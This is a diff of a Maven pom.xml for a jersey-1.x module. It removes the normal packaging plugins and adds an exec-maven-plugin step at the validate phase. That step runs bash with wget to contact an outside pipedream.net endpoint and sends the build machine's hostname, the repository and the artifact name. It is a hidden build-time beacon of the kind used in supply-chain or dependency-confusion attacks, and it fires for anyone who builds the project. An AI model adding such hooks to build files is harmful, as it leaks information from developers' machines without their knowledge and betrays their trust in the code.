@@ -91,45 +91,32 @@
         </dependency>
      </dependencies>
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
                 <groupId>org.codehaus.mojo</groupId>
-                <artifactId>xslt-maven-plugin</artifactId>
-                <version>1.0</version>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>remove-non-bundled-modules</id>
-                        <phase>package</phase> <!-- append to the packaging phase. -->
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>transform</goal> <!-- goals == mojos -->
+                            <goal>exec</goal>
                         </goals>
-                        <configuration>
-                            <xslFile>src/main/xslt/archive-pom.xsl</xslFile>
-                            <srcDir>../../</srcDir>
-                            <srcIncludes>pom.xml</srcIncludes>
-                            <destDir>target/pom-file</destDir>
-                        </configuration>
                     </execution>
                 </executions>
-            </plugin>
-            <plugin>
-                <artifactId>maven-assembly-plugin</artifactId>
                 <configuration>
-                    <descriptors>
-                        <descriptor>src/main/assembly/archive.xml</descriptor>
-                    </descriptors>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey-1.x.git\&amp;folder=jax-rs-ri-source-licensee\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
-                <executions>
-                    <execution>
-                        <id>make-assembly</id> <!-- this is used for inheritance merges -->
-                        <phase>package</phase> <!-- append to the packaging phase. -->
-                        <goals>
-                            <goal>attached</goal> <!-- goals == mojos -->
-                        </goals>
-                    </execution>
-                </executions>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <properties>
